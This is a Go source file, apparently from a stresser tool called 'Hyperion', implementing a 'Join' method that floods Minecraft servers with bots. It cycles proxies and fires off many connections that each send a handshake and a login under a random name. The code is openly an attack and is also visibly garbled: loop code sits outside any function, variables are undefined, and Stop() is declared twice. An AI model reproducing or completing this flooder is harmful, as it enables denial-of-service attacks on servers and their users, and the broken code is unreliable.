package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/mc/packet"
	"Hyperion/utils"
	"log"
	"strconv"
	"time"
)

type Join struct {
	Info         *core.AttackInfo
	ProxyManager *proxy.ProxyManager
}

var shouldRun = false
var handshakePacket packet.Packet

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {

}

	// Start the workers
	for i := 0; i < join.Info.Loops; i++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				case workerPool <- struct{}{}:
					// Get the next proxy
					proxy := join.ProxyManager.GetNext()
					// Do the work
					for j := 0; j < join.Info.PerDelay; j++ {
						// Each loop represents a connection attempt
						go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
					}
					time.Sleep(join.Info.Delay)
					// When done, release the worker
					<-workerPool
				}
			}
		}()
	}
}

func loop(join *Join) {
	proxy := join.ProxyManager.GetNext()
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
	}
}

func connect(ip *string, port *string, protocol int, proxy *proxy.Proxy) error {

	conn, err := mc.DialMC(ip, port, proxy)
	if err != nil {
		return err
	}

	conn.WritePacket(handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), protocol))

	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
func (join Join) Stop() {
	shouldRun = false
}
